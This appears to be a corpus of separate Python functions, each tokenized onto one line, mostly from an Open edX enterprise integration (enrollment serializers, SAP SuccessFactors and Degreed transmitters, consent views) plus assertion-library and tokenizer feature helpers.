def is_named ( self , filename ) : self . is_file ( ) if not isinstance ( filename , str_types ) : raise TypeError ( 'given filename arg must be a path' ) val_filename = os . path . basename ( os . path . abspath ( self . val ) ) if val_filename != filename : self . _err ( 'Expected filename <%s> to be equal to <%s>, but was not.' % ( val_filename , filename ) ) return self
def is_child_of ( self , parent ) : self . is_file ( ) if not isinstance ( parent , str_types ) : raise TypeError ( 'given parent directory arg must be a path' ) val_abspath = os . path . abspath ( self . val ) parent_abspath = os . path . abspath ( parent ) if not val_abspath . startswith ( parent_abspath ) : self . _err ( 'Expected file <%s> to be a child of <%s>, but was not.' % ( val_abspath , parent_abspath ) ) return self
def raises ( self , ex ) : if not callable ( self . val ) : raise TypeError ( 'val must be callable' ) if not issubclass ( ex , BaseException ) : raise TypeError ( 'given arg must be exception' ) return AssertionBuilder ( self . val , self . description , self . kind , ex )
def when_called_with ( self , * some_args , * * some_kwargs ) : if not self . expected : raise TypeError ( 'expected exception not set, raises() must be called first' ) try : self . val ( * some_args , * * some_kwargs ) except BaseException as e : if issubclass ( type ( e ) , self . expected ) : # chain on with exception message as val return AssertionBuilder ( str ( e ) , self . description , self . kind ) else : # got exception, but wrong type, so raise self . _err ( 'Expected <%s> to raise <%s> when called with (%s), but raised <%s>.' % ( self . val . __name__ , self . expected . __name__ , self . _fmt_args_kwargs ( * some_args , * * some_kwargs ) , type ( e ) . __name__ ) ) # didn't fail as expected, so raise self . _err ( 'Expected <%s> to raise <%s> when called with (%s).' % ( self . val . __name__ , self . expected . __name__ , self . _fmt_args_kwargs ( * some_args , * * some_kwargs ) ) )
def _err ( self , msg ) : out = '%s%s' % ( '[%s] ' % self . description if len ( self . description ) > 0 else '' , msg ) if self . kind == 'warn' : print ( out ) return self elif self . kind == 'soft' : global _soft_err _soft_err . append ( out ) return self else : raise AssertionError ( out )
def _fmt_args_kwargs ( self , * some_args , * * some_kwargs ) : if some_args : out_args = str ( some_args ) . lstrip ( '(' ) . rstrip ( ',)' ) if some_kwargs : out_kwargs = ', ' . join ( [ str ( i ) . lstrip ( '(' ) . rstrip ( ')' ) . replace ( ', ' , ': ' ) for i in [ ( k , some_kwargs [ k ] ) for k in sorted ( some_kwargs . keys ( ) ) ] ] ) if some_args and some_kwargs : return out_args + ', ' + out_kwargs elif some_args : return out_args elif some_kwargs : return out_kwargs else : return ''
def evaluate ( best_processed_path , model ) : x_test_char , x_test_type , y_test = prepare_feature ( best_processed_path , option = 'test' ) y_predict = model . predict ( [ x_test_char , x_test_type ] ) y_predict = ( y_predict . ravel ( ) > 0.5 ) . astype ( int ) f1score = f1_score ( y_test , y_predict ) precision = precision_score ( y_test , y_predict ) recall = recall_score ( y_test , y_predict ) return f1score , precision , recall
def _document_frequency ( X ) : if sp . isspmatrix_csr ( X ) : return np . bincount ( X . indices , minlength = X . shape [ 1 ] ) return np . diff ( sp . csc_matrix ( X , copy = False ) . indptr )
def create_feature_array ( text , n_pad = 21 ) : n = len ( text ) n_pad_2 = int ( ( n_pad - 1 ) / 2 ) text_pad = [ ' ' ] * n_pad_2 + [ t for t in text ] + [ ' ' ] * n_pad_2 x_char , x_type = [ ] , [ ] for i in range ( n_pad_2 , n_pad_2 + n ) : char_list = text_pad [ i + 1 : i + n_pad_2 + 1 ] + list ( reversed ( text_pad [ i - n_pad_2 : i ] ) ) + [ text_pad [ i ] ] char_map = [ CHARS_MAP . get ( c , 80 ) for c in char_list ] char_type = [ CHAR_TYPES_MAP . get ( CHAR_TYPE_FLATTEN . get ( c , 'o' ) , 4 ) for c in char_list ] x_char . append ( char_map ) x_type . append ( char_type ) x_char = np . array ( x_char ) . astype ( float ) x_type = np . array ( x_type ) . astype ( float ) return x_char , x_type
def create_n_gram_df ( df , n_pad ) : n_pad_2 = int ( ( n_pad - 1 ) / 2 ) for i in range ( n_pad_2 ) : df [ 'char-{}' . format ( i + 1 ) ] = df [ 'char' ] . shift ( i + 1 ) df [ 'type-{}' . format ( i + 1 ) ] = df [ 'type' ] . shift ( i + 1 ) df [ 'char{}' . format ( i + 1 ) ] = df [ 'char' ] . shift ( - i - 1 ) df [ 'type{}' . format ( i + 1 ) ] = df [ 'type' ] . shift ( - i - 1 ) return df [ n_pad_2 : - n_pad_2 ]
def _dictfetchall ( self , cursor ) : columns = [ col [ 0 ] for col in cursor . description ] return [ dict ( zip ( columns , row ) ) for row in cursor . fetchall ( ) ]
def connect ( self ) : if JwtBuilder is None : raise NotConnectedToOpenEdX ( "This package must be installed in an OpenEdX environment." ) now = int ( time ( ) ) jwt = JwtBuilder . create_jwt_for_user ( self . user ) self . client = EdxRestApiClient ( self . API_BASE_URL , append_slash = self . APPEND_SLASH , jwt = jwt , ) self . expires_at = now + self . expires_in
def refresh_token ( func ) : @ wraps ( func ) def inner ( self , * args , * * kwargs ) : if self . token_expired ( ) : self . connect ( ) return func ( self , * args , * * kwargs ) return inner
def redirect_if_blocked ( course_run_ids , user = None , ip_address = None , url = None ) : for course_run_id in course_run_ids : redirect_url = embargo_api . redirect_if_blocked ( CourseKey . from_string ( course_run_id ) , user = user , ip_address = ip_address , url = url ) if redirect_url : return redirect_url
def _get_results ( self , identity_provider , param_name , param_value , result_field_name ) : try : kwargs = { param_name : param_value } returned = self . client . providers ( identity_provider ) . users . get ( * * kwargs ) results = returned . get ( 'results' , [ ] ) except HttpNotFoundError : LOGGER . error ( 'username not found for third party provider={provider}, {querystring_param}={id}' . format ( provider = identity_provider , querystring_param = param_name , id = param_value ) ) results = [ ] for row in results : if row . get ( param_name ) == param_value : return row . get ( result_field_name ) return None
def course_discovery_api_client ( user , catalog_url ) : if JwtBuilder is None : raise NotConnectedToOpenEdX ( _ ( "To get a Catalog API client, this package must be " "installed in an Open edX environment." ) ) jwt = JwtBuilder . create_jwt_for_user ( user ) return EdxRestApiClient ( catalog_url , jwt = jwt )
def transmit ( self , payload , * * kwargs ) : items_to_create , items_to_update , items_to_delete , transmission_map = self . _partition_items ( payload ) self . _transmit_delete ( items_to_delete ) self . _transmit_create ( items_to_create ) self . _transmit_update ( items_to_update , transmission_map )
def _serialize_items ( self , channel_metadata_items ) : return json . dumps ( self . _prepare_items_for_transmission ( channel_metadata_items ) , sort_keys = True ) . encode ( 'utf-8' )
def _transmit_create ( self , channel_metadata_item_map ) : for chunk in chunks ( channel_metadata_item_map , self . enterprise_configuration . transmission_chunk_size ) : serialized_chunk = self . _serialize_items ( list ( chunk . values ( ) ) ) try : self . client . create_content_metadata ( serialized_chunk ) except ClientError as exc : LOGGER . error ( 'Failed to update [%s] content metadata items for integrated channel [%s] [%s]' , len ( chunk ) , self . enterprise_configuration . enterprise_customer . name , self . enterprise_configuration . channel_code , ) LOGGER . error ( exc ) else : self . _create_transmissions ( chunk )
def _transmit_update ( self , channel_metadata_item_map , transmission_map ) : for chunk in chunks ( channel_metadata_item_map , self . enterprise_configuration . transmission_chunk_size ) : serialized_chunk = self . _serialize_items ( list ( chunk . values ( ) ) ) try : self . client . update_content_metadata ( serialized_chunk ) except ClientError as exc : LOGGER . error ( 'Failed to update [%s] content metadata items for integrated channel [%s] [%s]' , len ( chunk ) , self . enterprise_configuration . enterprise_customer . name , self . enterprise_configuration . channel_code , ) LOGGER . error ( exc ) else : self . _update_transmissions ( chunk , transmission_map )
def _transmit_delete ( self , channel_metadata_item_map ) : for chunk in chunks ( channel_metadata_item_map , self . enterprise_configuration . transmission_chunk_size ) : serialized_chunk = self . _serialize_items ( list ( chunk . values ( ) ) ) try : self . client . delete_content_metadata ( serialized_chunk ) except ClientError as exc : LOGGER . error ( 'Failed to delete [%s] content metadata items for integrated channel [%s] [%s]' , len ( chunk ) , self . enterprise_configuration . enterprise_customer . name , self . enterprise_configuration . channel_code , ) LOGGER . error ( exc ) else : self . _delete_transmissions ( chunk . keys ( ) )
def _create_transmissions ( self , content_metadata_item_map ) : # pylint: disable=invalid-name ContentMetadataItemTransmission = apps . get_model ( 'integrated_channel' , 'ContentMetadataItemTransmission' ) transmissions = [ ] for content_id , channel_metadata in content_metadata_item_map . items ( ) : transmissions . append ( ContentMetadataItemTransmission ( enterprise_customer = self . enterprise_configuration . enterprise_customer , integrated_channel_code = self . enterprise_configuration . channel_code ( ) , content_id = content_id , channel_metadata = channel_metadata ) ) ContentMetadataItemTransmission . objects . bulk_create ( transmissions )
def _update_transmissions ( self , content_metadata_item_map , transmission_map ) : for content_id , channel_metadata in content_metadata_item_map . items ( ) : transmission = transmission_map [ content_id ] transmission . channel_metadata = channel_metadata transmission . save ( )
def _delete_transmissions ( self , content_metadata_item_ids ) : # pylint: disable=invalid-name ContentMetadataItemTransmission = apps . get_model ( 'integrated_channel' , 'ContentMetadataItemTransmission' ) ContentMetadataItemTransmission . objects . filter ( enterprise_customer = self . enterprise_configuration . enterprise_customer , integrated_channel_code = self . enterprise_configuration . channel_code ( ) , content_id__in = content_metadata_item_ids ) . delete ( )
def validate_username ( self , value ) : try : user = User . objects . get ( username = value ) except User . DoesNotExist : raise serializers . ValidationError ( "User does not exist" ) try : enterprise_customer_user = models . EnterpriseCustomerUser . objects . get ( user_id = user . pk ) except models . EnterpriseCustomerUser . DoesNotExist : raise serializers . ValidationError ( "User has no EnterpriseCustomerUser" ) self . enterprise_customer_user = enterprise_customer_user return value
def save ( self ) : # pylint: disable=arguments-differ course_id = self . validated_data [ 'course_id' ] __ , created = models . EnterpriseCourseEnrollment . objects . get_or_create ( enterprise_customer_user = self . enterprise_customer_user , course_id = course_id , ) if created : track_enrollment ( 'rest-api-enrollment' , self . enterprise_customer_user . user_id , course_id )
def get_groups ( self , obj ) : if obj . user : return [ group . name for group in obj . user . groups . filter ( name__in = ENTERPRISE_PERMISSION_GROUPS ) ] return [ ]
def validate_username ( self , value ) : try : self . user = User . objects . get ( username = value ) except User . DoesNotExist : raise serializers . ValidationError ( "User does not exist" ) return value
def save ( self ) : # pylint: disable=arguments-differ enterprise_customer = self . validated_data [ 'enterprise_customer' ] ecu = models . EnterpriseCustomerUser ( user_id = self . user . pk , enterprise_customer = enterprise_customer , ) ecu . save ( )
def create ( self , validated_data ) : ret = [ ] for attrs in validated_data : if 'non_field_errors' not in attrs and not any ( isinstance ( attrs [ field ] , list ) for field in attrs ) : ret . append ( self . child . create ( attrs ) ) else : ret . append ( attrs ) return ret
def to_representation ( self , data ) : return [ self . child . to_representation ( item ) if 'detail' in item else item for item in data ]
def create ( self , validated_data ) : enterprise_customer = self . context . get ( 'enterprise_customer' ) lms_user = validated_data . get ( 'lms_user_id' ) tpa_user = validated_data . get ( 'tpa_user_id' ) user_email = validated_data . get ( 'user_email' ) course_run_id = validated_data . get ( 'course_run_id' ) course_mode = validated_data . get ( 'course_mode' ) cohort = validated_data . get ( 'cohort' ) email_students = validated_data . get ( 'email_students' ) is_active = validated_data . get ( 'is_active' ) enterprise_customer_user = lms_user or tpa_user or user_email if isinstance ( enterprise_customer_user , models . EnterpriseCustomerUser ) : validated_data [ 'enterprise_customer_user' ] = enterprise_customer_user try : if is_active : enterprise_customer_user . enroll ( course_run_id , course_mode , cohort = cohort ) else : enterprise_customer_user . unenroll ( course_run_id ) except ( CourseEnrollmentDowngradeError , CourseEnrollmentPermissionError , HttpClientError ) as exc : validated_data [ 'detail' ] = str ( exc ) return validated_data if is_active : track_enrollment ( 'enterprise-customer-enrollment-api' , enterprise_customer_user . user_id , course_run_id ) else : if is_active : enterprise_customer_user = enterprise_customer . enroll_user_pending_registration ( user_email , course_mode , course_run_id , cohort = cohort ) else : enterprise_customer . clear_pending_registration ( user_email , course_run_id ) if email_students : enterprise_customer . notify_enrolled_learners ( self . context . get ( 'request_user' ) , course_run_id , [ enterprise_customer_user ] ) validated_data [ 'detail' ] = 'success' return validated_data
def validate_lms_user_id ( self , value ) : enterprise_customer = self . context . get ( 'enterprise_customer' ) try : # Ensure the given user is associated with the enterprise. return models . EnterpriseCustomerUser . objects . get ( user_id = value , enterprise_customer = enterprise_customer ) except models . EnterpriseCustomerUser . DoesNotExist : pass return None
def validate_course_run_id ( self , value ) : enterprise_customer = self . context . get ( 'enterprise_customer' ) if not enterprise_customer . catalog_contains_course ( value ) : raise serializers . ValidationError ( 'The course run id {course_run_id} is not in the catalog ' 'for Enterprise Customer {enterprise_customer}' . format ( course_run_id = value , enterprise_customer = enterprise_customer . name , ) ) return value
def validate ( self , data ) : # pylint: disable=arguments-differ lms_user_id = data . get ( 'lms_user_id' ) tpa_user_id = data . get ( 'tpa_user_id' ) user_email = data . get ( 'user_email' ) if not lms_user_id and not tpa_user_id and not user_email : raise serializers . ValidationError ( 'At least one of the following fields must be specified and map to an EnterpriseCustomerUser: ' 'lms_user_id, tpa_user_id, user_email' ) return data
def create_switch ( apps , schema_editor ) : Switch = apps . get_model ( 'waffle' , 'Switch' ) Switch . objects . update_or_create ( name = ENTERPRISE_ROLE_BASED_ACCESS_CONTROL_SWITCH , defaults = { 'active' : False } )
def delete_switch ( apps , schema_editor ) : Switch = apps . get_model ( 'waffle' , 'Switch' ) Switch . objects . filter ( name = ENTERPRISE_ROLE_BASED_ACCESS_CONTROL_SWITCH ) . delete ( )
def create_switch ( apps , schema_editor ) : Switch = apps . get_model ( 'waffle' , 'Switch' ) Switch . objects . get_or_create ( name = 'SAP_USE_ENTERPRISE_ENROLLMENT_PAGE' , defaults = { 'active' : False } )
def handle_transmission_error ( self , learner_data , request_exception ) : try : sys_msg = request_exception . response . content except AttributeError : pass else : if 'user account is inactive' in sys_msg : ecu = EnterpriseCustomerUser . objects . get ( enterprise_enrollments__id = learner_data . enterprise_course_enrollment_id ) ecu . active = False ecu . save ( ) LOGGER . warning ( 'User %s with ID %s and email %s is a former employee of %s ' 'and has been marked inactive in SAPSF. Now marking inactive internally.' , ecu . username , ecu . user_id , ecu . user_email , ecu . enterprise_customer ) return super ( SapSuccessFactorsLearnerTransmitter , self ) . handle_transmission_error ( learner_data , request_exception )
def update_throttle_scope ( self ) : self . scope = SERVICE_USER_SCOPE self . rate = self . get_rate ( ) self . num_requests , self . duration = self . parse_rate ( self . rate )
def get_learner_data_records ( self , enterprise_enrollment , completed_date = None , grade = None , is_passing = False ) : # pylint: disable=invalid-name LearnerDataTransmissionAudit = apps . get_model ( 'integrated_channel' , 'LearnerDataTransmissionAudit' ) completed_timestamp = None course_completed = False if completed_date is not None : completed_timestamp = parse_datetime_to_epoch_millis ( completed_date ) course_completed = is_passing return [ LearnerDataTransmissionAudit ( enterprise_course_enrollment_id = enterprise_enrollment . id , course_id = enterprise_enrollment . course_id , course_completed = course_completed , completed_timestamp = completed_timestamp , grade = grade , ) ]
def transmit ( self , payload , * * kwargs ) : items_to_create , items_to_update , items_to_delete , transmission_map = self . _partition_items ( payload ) self . _prepare_items_for_delete ( items_to_delete ) prepared_items = { } prepared_items . update ( items_to_create ) prepared_items . update ( items_to_update ) prepared_items . update ( items_to_delete ) skip_metadata_transmission = False for chunk in chunks ( prepared_items , self . enterprise_configuration . transmission_chunk_size ) : chunked_items = list ( chunk . values ( ) ) if skip_metadata_transmission : # Remove the failed items from the create/update/delete dictionaries, # so ContentMetadataItemTransmission objects are not synchronized for # these items below. self . _remove_failed_items ( chunked_items , items_to_create , items_to_update , items_to_delete ) else : try : self . client . update_content_metadata ( self . _serialize_items ( chunked_items ) ) except ClientError as exc : LOGGER . error ( 'Failed to update [%s] content metadata items for integrated channel [%s] [%s]' , len ( chunked_items ) , self . enterprise_configuration . enterprise_customer . name , self . enterprise_configuration . channel_code , ) LOGGER . error ( exc ) # Remove the failed items from the create/update/delete dictionaries, # so ContentMetadataItemTransmission objects are not synchronized for # these items below. self . _remove_failed_items ( chunked_items , items_to_create , items_to_update , items_to_delete ) # SAP servers throttle incoming traffic, If a request fails than the subsequent would fail too, # So, no need to keep trying and failing. We should stop here and retry later. skip_metadata_transmission = True self . _create_transmissions ( items_to_create ) self . _update_transmissions ( items_to_update , transmission_map ) self . _delete_transmissions ( items_to_delete . keys ( ) )
def handle ( self , * args , * * options ) : if not CourseEnrollment : raise NotConnectedToOpenEdX ( "This package must be installed in an OpenEdX environment." ) days , enterprise_customer = self . parse_arguments ( * args , * * options ) if enterprise_customer : try : lrs_configuration = XAPILRSConfiguration . objects . get ( active = True , enterprise_customer = enterprise_customer ) except XAPILRSConfiguration . DoesNotExist : raise CommandError ( 'No xAPI Configuration found for "{enterprise_customer}"' . format ( enterprise_customer = enterprise_customer . name ) ) # Send xAPI analytics data to the configured LRS self . send_xapi_statements ( lrs_configuration , days ) else : for lrs_configuration in XAPILRSConfiguration . objects . filter ( active = True ) : self . send_xapi_statements ( lrs_configuration , days )
def _create_session ( self , scope ) : now = datetime . datetime . utcnow ( ) if self . session is None or self . expires_at is None or now >= self . expires_at : # Create a new session with a valid token if self . session : self . session . close ( ) oauth_access_token , expires_at = self . _get_oauth_access_token ( self . enterprise_configuration . key , self . enterprise_configuration . secret , self . enterprise_configuration . degreed_user_id , self . enterprise_configuration . degreed_user_password , scope ) session = requests . Session ( ) session . timeout = self . SESSION_TIMEOUT session . headers [ 'Authorization' ] = 'Bearer {}' . format ( oauth_access_token ) session . headers [ 'content-type' ] = 'application/json' self . session = session self . expires_at = expires_at
def ensure_data_exists ( self , request , data , error_message = None ) : if not data : error_message = ( error_message or "Unable to fetch API response from endpoint '{}'." . format ( request . get_full_path ( ) ) ) LOGGER . error ( error_message ) raise NotFound ( error_message )
def course_enrollments ( self , request , pk ) : enterprise_customer = self . get_object ( ) serializer = serializers . EnterpriseCustomerCourseEnrollmentsSerializer ( data = request . data , many = True , context = { 'enterprise_customer' : enterprise_customer , 'request_user' : request . user , } ) if serializer . is_valid ( ) : serializer . save ( ) return Response ( serializer . data , status = HTTP_200_OK ) return Response ( serializer . errors , status = HTTP_400_BAD_REQUEST )
def with_access_to ( self , request , * args , * * kwargs ) : # pylint: disable=invalid-name,unused-argument self . queryset = self . queryset . order_by ( 'name' ) enterprise_id = self . request . query_params . get ( 'enterprise_id' , None ) enterprise_slug = self . request . query_params . get ( 'enterprise_slug' , None ) enterprise_name = self . request . query_params . get ( 'search' , None ) if enterprise_id is not None : self . queryset = self . queryset . filter ( uuid = enterprise_id ) elif enterprise_slug is not None : self . queryset = self . queryset . filter ( slug = enterprise_slug ) elif enterprise_name is not None : self . queryset = self . queryset . filter ( name__icontains = enterprise_name ) return self . list ( request , * args , * * kwargs )
def get_missing_params_message ( self , parameter_state ) : params = ', ' . join ( name for name , present in parameter_state if not present ) return self . MISSING_REQUIRED_PARAMS_MSG . format ( params )
def transform_title ( self , content_metadata_item ) : title_with_locales = [ ] for locale in self . enterprise_configuration . get_locales ( ) : title_with_locales . append ( { 'locale' : locale , 'value' : content_metadata_item . get ( 'title' , '' ) } ) return title_with_locales
def transform_description ( self , content_metadata_item ) : description_with_locales = [ ] for locale in self . enterprise_configuration . get_locales ( ) : description_with_locales . append ( { 'locale' : locale , 'value' : ( content_metadata_item . get ( 'full_description' ) or content_metadata_item . get ( 'short_description' ) or content_metadata_item . get ( 'title' , '' ) ) } ) return description_with_locales
def transform_image ( self , content_metadata_item ) : image_url = '' if content_metadata_item [ 'content_type' ] in [ 'course' , 'program' ] : image_url = content_metadata_item . get ( 'card_image_url' ) elif content_metadata_item [ 'content_type' ] == 'courserun' : image_url = content_metadata_item . get ( 'image_url' ) return image_url
def transform_courserun_title ( self , content_metadata_item ) : title = content_metadata_item . get ( 'title' ) or '' course_run_start = content_metadata_item . get ( 'start' ) if course_run_start : if course_available_for_enrollment ( content_metadata_item ) : title += ' ({starts}: {:%B %Y})' . format ( parse_lms_api_datetime ( course_run_start ) , starts = _ ( 'Starts' ) ) else : title += ' ({:%B %Y} - {enrollment_closed})' . format ( parse_lms_api_datetime ( course_run_start ) , enrollment_closed = _ ( 'Enrollment Closed' ) ) title_with_locales = [ ] content_metadata_language_code = transform_language_code ( content_metadata_item . get ( 'content_language' , '' ) ) for locale in self . enterprise_configuration . get_locales ( default_locale = content_metadata_language_code ) : title_with_locales . append ( { 'locale' : locale , 'value' : title } ) return title_with_locales
def transform_courserun_description ( self , content_metadata_item ) : description_with_locales = [ ] content_metadata_language_code = transform_language_code ( content_metadata_item . get ( 'content_language' , '' ) ) for locale in self . enterprise_configuration . get_locales ( default_locale = content_metadata_language_code ) : description_with_locales . append ( { 'locale' : locale , 'value' : ( content_metadata_item [ 'full_description' ] or content_metadata_item [ 'short_description' ] or content_metadata_item [ 'title' ] or '' ) } ) return description_with_locales
def transform_courserun_schedule ( self , content_metadata_item ) : start = content_metadata_item . get ( 'start' ) or UNIX_MIN_DATE_STRING end = content_metadata_item . get ( 'end' ) or UNIX_MAX_DATE_STRING return [ { 'startDate' : parse_datetime_to_epoch_millis ( start ) , 'endDate' : parse_datetime_to_epoch_millis ( end ) , 'active' : current_time_is_in_interval ( start , end ) } ]
def get_content_id ( self , content_metadata_item ) : content_id = content_metadata_item . get ( 'key' , '' ) if content_metadata_item [ 'content_type' ] == 'program' : content_id = content_metadata_item . get ( 'uuid' , '' ) return content_id
def chunks ( dictionary , chunk_size ) : iterable = iter ( dictionary ) for __ in range ( 0 , len ( dictionary ) , chunk_size ) : yield { key : dictionary [ key ] for key in islice ( iterable , chunk_size ) }
def get_link_by_email ( self , user_email ) : try : user = User . objects . get ( email = user_email ) try : return self . get ( user_id = user . id ) except EnterpriseCustomerUser . DoesNotExist : pass except User . DoesNotExist : pass try : return PendingEnterpriseCustomerUser . objects . get ( user_email = user_email ) except PendingEnterpriseCustomerUser . DoesNotExist : pass return None
def enterprise_customer_uuid ( self ) : try : enterprise_user = EnterpriseCustomerUser . objects . get ( user_id = self . user . id ) except ObjectDoesNotExist : LOGGER . warning ( 'User {} has a {} assignment but is not linked to an enterprise!' . format ( self . __class__ , self . user . id ) ) return None except MultipleObjectsReturned : LOGGER . warning ( 'User {} is linked to multiple enterprises, which is not yet supported!' . format ( self . user . id ) ) return None return str ( enterprise_user . enterprise_customer . uuid )
def export ( self ) : content_metadata_export = { } content_metadata_items = self . enterprise_api . get_content_metadata ( self . enterprise_customer ) LOGGER . info ( 'Retrieved content metadata for enterprise [%s]' , self . enterprise_customer . name ) for item in content_metadata_items : transformed = self . _transform_item ( item ) LOGGER . info ( 'Exporting content metadata item with plugin configuration [%s]: [%s]' , self . enterprise_configuration , json . dumps ( transformed , indent = 4 ) , ) content_metadata_item_export = ContentMetadataItemExport ( item , transformed ) content_metadata_export [ content_metadata_item_export . content_id ] = content_metadata_item_export return OrderedDict ( sorted ( content_metadata_export . items ( ) ) )
def _transform_item ( self , content_metadata_item ) : content_metadata_type = content_metadata_item [ 'content_type' ] transformed_item = { } for integrated_channel_schema_key , edx_data_schema_key in self . DATA_TRANSFORM_MAPPING . items ( ) : # Look for transformer functions defined on subclasses. # Favor content type-specific functions. transformer = ( getattr ( self , 'transform_{content_type}_{edx_data_schema_key}' . format ( content_type = content_metadata_type , edx_data_schema_key = edx_data_schema_key ) , None ) or getattr ( self , 'transform_{edx_data_schema_key}' . format ( edx_data_schema_key = edx_data_schema_key ) , None ) ) if transformer : transformed_item [ integrated_channel_schema_key ] = transformer ( content_metadata_item ) else : # The concrete subclass does not define an override for the given field, # so just use the data key to index the content metadata item dictionary. try : transformed_item [ integrated_channel_schema_key ] = content_metadata_item [ edx_data_schema_key ] except KeyError : # There may be a problem with the DATA_TRANSFORM_MAPPING on # the concrete subclass or the concrete subclass does not implement # the appropriate field tranformer function. LOGGER . exception ( 'Failed to transform content metadata item field [%s] for [%s]: [%s]' , edx_data_schema_key , self . enterprise_customer . name , content_metadata_item , ) return transformed_item
def get_consent_record ( self , request ) : username , course_id , program_uuid , enterprise_customer_uuid = self . get_required_query_params ( request ) return get_data_sharing_consent ( username , enterprise_customer_uuid , course_id = course_id , program_uuid = program_uuid )
def get_no_record_response ( self , request ) : username , course_id , program_uuid , enterprise_customer_uuid = self . get_required_query_params ( request ) data = { self . REQUIRED_PARAM_USERNAME : username , self . REQUIRED_PARAM_ENTERPRISE_CUSTOMER : enterprise_customer_uuid , self . CONSENT_EXISTS : False , self . CONSENT_GRANTED : False , self . CONSENT_REQUIRED : False , } if course_id : data [ self . REQUIRED_PARAM_COURSE_ID ] = course_id if program_uuid : data [ self . REQUIRED_PARAM_PROGRAM_UUID ] = program_uuid return Response ( data , status = HTTP_200_OK )
def ready ( self ) : from enterprise . signals import handle_user_post_save from django . db . models . signals import pre_migrate , post_save post_save . connect ( handle_user_post_save , sender = self . auth_user_model , dispatch_uid = USER_POST_SAVE_DISPATCH_UID ) pre_migrate . connect ( self . _disconnect_user_post_save_for_migrations )
def _disconnect_user_post_save_for_migrations ( self , sender , * * kwargs ) : # pylint: disable=unused-argument from django . db . models . signals import post_save post_save . disconnect ( sender = self . auth_user_model , dispatch_uid = USER_POST_SAVE_DISPATCH_UID )
def get_actor ( self , username , email ) : return Agent ( name = username , mbox = 'mailto:{email}' . format ( email = email ) , )
def get_object ( self , name , description ) : return Activity ( id = X_API_ACTIVITY_COURSE , definition = ActivityDefinition ( name = LanguageMap ( { 'en-US' : ( name or '' ) . encode ( "ascii" , "ignore" ) . decode ( 'ascii' ) } ) , description = LanguageMap ( { 'en-US' : ( description or '' ) . encode ( "ascii" , "ignore" ) . decode ( 'ascii' ) } ) , ) , )
def clean_course ( self ) : course_id = self . cleaned_data [ self . Fields . COURSE ] . strip ( ) if not course_id : return None try : client = EnrollmentApiClient ( ) return client . get_course_details ( course_id ) except ( HttpClientError , HttpServerError ) : raise ValidationError ( ValidationMessages . INVALID_COURSE_ID . format ( course_id = course_id ) )
def clean_notify ( self ) : return self . cleaned_data . get ( self . Fields . NOTIFY , self . NotificationTypes . DEFAULT )
def _validate_course ( self ) : # Verify that the selected mode is valid for the given course . course_details = self . cleaned_data . get ( self . Fields . COURSE ) if course_details : course_mode = self . cleaned_data . get ( self . Fields . COURSE_MODE ) if not course_mode : raise ValidationError ( ValidationMessages . COURSE_WITHOUT_COURSE_MODE ) valid_course_modes = course_details [ "course_modes" ] if all ( course_mode != mode [ "slug" ] for mode in valid_course_modes ) : error = ValidationError ( ValidationMessages . COURSE_MODE_INVALID_FOR_COURSE . format ( course_mode = course_mode , course_id = course_details [ "course_id" ] , ) ) raise ValidationError ( { self . Fields . COURSE_MODE : error } )
def _validate_program ( self ) : program = self . cleaned_data . get ( self . Fields . PROGRAM ) if not program : return course_runs = get_course_runs_from_program ( program ) try : client = CourseCatalogApiClient ( self . _user , self . _enterprise_customer . site ) available_modes = client . get_common_course_modes ( course_runs ) course_mode = self . cleaned_data . get ( self . Fields . COURSE_MODE ) except ( HttpClientError , HttpServerError ) : raise ValidationError ( ValidationMessages . FAILED_TO_OBTAIN_COURSE_MODES . format ( program_title = program . get ( "title" ) ) ) if not course_mode : raise ValidationError ( ValidationMessages . COURSE_WITHOUT_COURSE_MODE ) if course_mode not in available_modes : raise ValidationError ( ValidationMessages . COURSE_MODE_NOT_AVAILABLE . format ( mode = course_mode , program_title = program . get ( "title" ) , modes = ", " . join ( available_modes ) ) )
def clean ( self ) : cleaned_data = super ( EnterpriseCustomerReportingConfigAdminForm , self ) . clean ( ) report_customer = cleaned_data . get ( 'enterprise_customer' ) # Check that any selected catalogs are tied to the selected enterprise. invalid_catalogs = [ '{} ({})' . format ( catalog . title , catalog . uuid ) for catalog in cleaned_data . get ( 'enterprise_customer_catalogs' ) if catalog . enterprise_customer != report_customer ] if invalid_catalogs : message = _ ( 'These catalogs for reporting do not match enterprise' 'customer {enterprise_customer}: {invalid_catalogs}' , ) . format ( enterprise_customer = report_customer , invalid_catalogs = invalid_catalogs , ) self . add_error ( 'enterprise_customer_catalogs' , message )
def verify_edx_resources ( ) : required_methods = { 'ProgramDataExtender' : ProgramDataExtender , } for method in required_methods : if required_methods [ method ] is None : raise NotConnectedToOpenEdX ( _ ( "The following method from the Open edX platform is necessary for this view but isn't available." ) + "\nUnavailable: {method}" . format ( method = method ) )
def get_global_context ( request , enterprise_customer ) : platform_name = get_configuration_value ( "PLATFORM_NAME" , settings . PLATFORM_NAME ) # pylint: disable=no-member return { 'enterprise_customer' : enterprise_customer , 'LMS_SEGMENT_KEY' : settings . LMS_SEGMENT_KEY , 'LANGUAGE_CODE' : get_language_from_request ( request ) , 'tagline' : get_configuration_value ( "ENTERPRISE_TAGLINE" , settings . ENTERPRISE_TAGLINE ) , 'platform_description' : get_configuration_value ( "PLATFORM_DESCRIPTION" , settings . PLATFORM_DESCRIPTION , ) , 'LMS_ROOT_URL' : settings . LMS_ROOT_URL , 'platform_name' : platform_name , 'header_logo_alt_text' : _ ( '{platform_name} home page' ) . format ( platform_name = platform_name ) , 'welcome_text' : constants . WELCOME_TEXT . format ( platform_name = platform_name ) , 'enterprise_welcome_text' : constants . ENTERPRISE_WELCOME_TEXT . format ( enterprise_customer_name = enterprise_customer . name , platform_name = platform_name , strong_start = '<strong>' , strong_end = '</strong>' , line_break = '<br/>' , privacy_policy_link_start = "<a href='{pp_url}' target='_blank'>" . format ( pp_url = get_configuration_value ( 'PRIVACY' , 'https://www.edx.org/edx-privacy-policy' , type = 'url' ) , ) , privacy_policy_link_end = "</a>" , ) , }
def render_page_with_error_code_message ( request , context_data , error_code , log_message ) : LOGGER . error ( log_message ) messages . add_generic_error_message_with_code ( request , error_code ) return render ( request , ENTERPRISE_GENERAL_ERROR_PAGE , context = context_data , status = 404 , )
def course_or_program_exist ( self , course_id , program_uuid ) : course_exists = course_id and CourseApiClient ( ) . get_course_details ( course_id ) program_exists = program_uuid and CourseCatalogApiServiceClient ( ) . program_exists ( program_uuid ) return course_exists or program_exists
